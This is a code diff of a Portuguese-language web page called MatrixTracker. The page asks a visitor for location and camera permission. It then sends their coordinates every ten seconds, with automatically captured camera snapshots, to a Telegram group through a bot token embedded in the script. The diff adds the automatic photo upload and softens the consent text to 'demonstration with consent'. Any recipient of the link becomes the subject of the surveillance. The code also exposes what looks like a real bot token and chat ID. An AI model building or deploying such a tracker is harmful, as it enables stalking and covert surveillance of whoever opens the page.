@@ -66,8 +66,8 @@
 <div id="consentOverlay" class="overlay">
   <div class="consent" role="dialog" aria-modal="true">
     <h1>MatrixTracker — autorização necessária</h1>
-    <p>Este site coletará sua <strong>localização</strong> e ativará sua <strong>câmera</strong> para demonstração. Ao permitir, você aceita que as coordenadas (latitude/longitude/precisão) sejam enviadas automaticamente para o grupo do Telegram configurado pelo administrador.</p>
-    <p style="font-size:13px; color:#9fffd0">Uso apenas para fins demonstrativos. Se você não concorda, feche esta página.</p>
+    <p>Este site coletará sua <strong>localização</strong> e ativará sua <strong>câmera</strong> para demonstração. Ao permitir, você aceita que as coordenadas (latitude/longitude/precisão) e snapshots sejam enviados automaticamente para o grupo do Telegram configurado pelo administrador.</p>
+    <p style="font-size:13px; color:#9fffd0">Uso apenas para fins demonstrativos e com consentimento. Se você não concorda, feche esta página.</p>
     <div class="actions">
       <button id="declineBtn" class="btn btn-decline">Recusar</button>
       <button id="acceptBtn" class="btn btn-accept">Aceitar e iniciar</button>
@@ -137,8 +137,11 @@
 
 <script>
 /* ======= CONFIGURE AQUI ======= */
+/* COLOQUE AQUI SEU TOKEN E CHAT_ID.
+   AVISO: Embutir token no front-end é inseguro. Para produção, mova para um servidor. */
 const BOT_TOKEN = "8546822678:AAFKdw5cG9XzDIVi1XLi2-jXL6vTNoHcorE";
-const CHAT_ID = "-396501936";
+const CHAT_ID = "-1003413487548";
+
 /* ============================== */
 
 const CONSENT_OVERLAY = document.getElementById('consentOverlay');
@@ -153,12 +156,12 @@ let map, marker, accuracyCircle;
 let watchId = null;
 let sendingPaused = false;
 let lastSentTs = 0;
-const SEND_INTERVAL_MS = 10000;
+const SEND_INTERVAL_MS = 10000; // ajuste aqui (ms)
 document.getElementById('intervalLbl').innerText = (SEND_INTERVAL_MS/1000) + "s";
 
 let lastSnapshotBlob = null;
 
-// ====== Detectar marca do dispositivo ======
+// ====== Detectar marca do dispositivo (exibição apenas) ======
 function detectarMarca() {
   const ua = navigator.userAgent.toLowerCase();
   if (ua.includes("samsung")) return "Samsung";
@@ -176,7 +179,9 @@ const MARCA = detectarMarca();
 // UI actions
 DECLINE_BTN.onclick = () => {
   alert("Você recusou as permissões. Esta página será fechada.");
-  window.close?.() || (CONSENT_OVERLAY.style.display = 'none', STATUS.innerText = 'Permissões recusadas.');
+  try { window.close(); } catch(e) {}
+  CONSENT_OVERLAY.style.display = 'none';
+  STATUS.innerText = 'Permissões recusadas.';
 };
 
 ACCEPT_BTN.onclick = async () => {
@@ -230,13 +235,13 @@ function onPosition(pos) {
   document.getElementById('lon').innerText = lon.toFixed(6);
   document.getElementById('acc').innerText = acc ? acc.toFixed(1) : '-';
   
-  // ✅ Atualiza INFOBOX com marca do dispositivo
+  // Atualiza INFOBOX com marca do dispositivo
   INFO.innerText = 
     `Atualizado: ${new Date(ts).toLocaleString()}\n` +
     `Lat: ${lat}\n` +
     `Lon: ${lon}\n` +
     `Precisão: ${acc} m\n` +
-    `Marca do dispositivo: ${MARCA}`;
+    `Marca: ${MARCA}`;
 
   if (!marker) {
     marker = L.marker([lat,lon]).addTo(map).bindPopup('Você está aqui (live)').openPopup();
@@ -261,7 +266,7 @@ function onPositionError(err) {
   STATUS.innerText = "Erro obtendo localização.";
 }
 
-// Snapshot
+// Snapshot (manual)
 document.getElementById('snapBtn').onclick = takeSnapshot;
 document.getElementById('downloadBtn').onclick = downloadSnapshot;
 
@@ -272,11 +277,13 @@ async function takeSnapshot() {
   canvas.height = VIDEO.videoHeight || 480;
   const ctx = canvas.getContext('2d');
   ctx.drawImage(VIDEO, 0,0, canvas.width, canvas.height);
-  canvas.toBlob(blob => {
+  const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+  if (blob) {
     lastSnapshotBlob = blob;
     INFO.innerText = INFO.innerText + "\nSnapshot capturado.";
-    sendPhotoToTelegram(blob, `snapshot_${Date.now()}.jpg`);
-  }, 'image/jpeg', 0.8);
+    // opcional: enviar manualmente
+    sendPhotoToTelegram(blob, `snapshot_${Date.now()}.jpg`, "Snapshot manual — MatrixTracker");
+  }
 }
 
 function downloadSnapshot() {
@@ -292,47 +299,60 @@ function downloadSnapshot() {
 document.getElementById('btnPause').onclick = () => { sendingPaused = true; STATUS.innerText = 'Envio pausado.'; };
 document.getElementById('btnResume').onclick = () => { sendingPaused = false; STATUS.innerText = 'Envio ativo.'; lastSentTs = 0; };
 
-// Attempt to send coords + optional snapshot
+// ======= ENVIAR MENSAGEM + FOTO AUTOMATICAMENTE =======
 async function attemptSend(lat, lon, acc, ts) {
   INFO.innerText = INFO.innerText + `\nEnviando atualização... ${new Date(ts).toLocaleTimeString()}`;
 
-  const msg = `📍 *Atualização de localização (MatrixTracker)*\n\n` +
-              `Latitude: ${lat}\nLongitude: ${lon}\nPrecisão: ${acc} m\nHora: ${new Date(ts).toLocaleString()}\n\n` +
-              `Abrir no Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+  // mensagem formatada (Markdown) - cuidado com caracteres especiais
+  const msg = `📡 *MatrixTracker — Atualização ao vivo*\n\n` +
+              `🌍 *Latitude:* ${lat}\n` +
+              `🌍 *Longitude:* ${lon}\n` +
+              `🎯 *Precisão:* ${acc} m\n` +
+              `🕒 *Hora:* ${new Date(ts).toLocaleString()}\n\n` +
+              `🔗 Abrir no Maps:\nhttps://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
 
+  // --- Envia texto primeiro ---
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
       body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
     });
-    INFO.innerText = INFO.innerText + "\nMensagem de texto enviada ao Telegram.";
+
+    if (!res.ok) {
+      console.warn('sendMessage deu não-ok', res.status);
+      INFO.innerText += `\n❌ Falha ao enviar texto (status ${res.status}).`;
+    } else {
+      INFO.innerText += `\n✔ Texto enviado ao Telegram.`;
+    }
   } catch (err) {
     console.warn('Erro ao enviar texto', err);
-    INFO.innerText = INFO.innerText + "\nFalha ao enviar mensagem de texto.";
+    INFO.innerText += `\n❌ Erro ao enviar texto: ${err.message || err}`;
   }
 
+  // --- Tenta enviar foto (snapshot) ---
   if (VIDEO && VIDEO.srcObject) {
     try {
       const canvas = document.createElement('canvas');
       canvas.width = VIDEO.videoWidth || 640;
       canvas.height = VIDEO.videoHeight || 480;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(VIDEO, 0,0, canvas.width, canvas.height);
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+      ctx.drawImage(VIDEO, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
       if (blob) {
-        const filename = `snap_${Date.now()}.jpg`;
-        const sent = await sendPhotoToTelegram(blob, filename, `${msg}\n\n(Envio de imagem automático)`);
-        if (sent) INFO.innerText = INFO.innerText + "\nSnapshot enviado ao Telegram.";
-        else INFO.innerText = INFO.innerText + "\nSnapshot não enviado (CORS ou erro).";
+        const filename = `live_${Date.now()}.jpg`;
+        const ok = await sendPhotoToTelegram(blob, filename, `📸 Snapshot automático — ${new Date(ts).toLocaleString()}`);
+        if (ok) INFO.innerText += `\n📸 Foto enviada automaticamente.`;
+        else INFO.innerText += `\n⚠️ Não foi possível enviar a foto (CORS ou outra falha).`;
       }
     } catch (err) {
       console.warn('Erro snapshot auto', err);
+      INFO.innerText += `\n⚠️ Erro ao capturar/enviar snapshot: ${err.message || err}`;
     }
   }
 }
 
-// Send photo via Telegram API
+// Envia foto via API Telegram (FormData)
 async function sendPhotoToTelegram(blob, filename, caption = '') {
   try {
     const form = new FormData();
@@ -345,21 +365,26 @@ async function sendPhotoToTelegram(blob, filename, caption = '') {
       body: form
     });
 
-    if (!res.ok) return false;
+    if (!res.ok) {
+      console.warn('sendPhoto não-ok', res.status);
+      return false;
+    }
     const json = await res.json();
-    return json.ok === true;
+    return json && json.ok === true;
   } catch (err) {
-    console.warn('sendPhoto error (CORS likely):', err);
+    console.warn('sendPhoto error (possível CORS):', err);
     return false;
   }
 }
 
 // Cleanup
 window.addEventListener('beforeunload', () => {
-  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-  if (VIDEO && VIDEO.srcObject) {
-    VIDEO.srcObject.getTracks().forEach(t => t.stop());
-  }
+  try {
+    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+    if (VIDEO && VIDEO.srcObject) {
+      VIDEO.srcObject.getTracks().forEach(t => t.stop());
+    }
+  } catch(e){}
 });
 </script>
 </body>
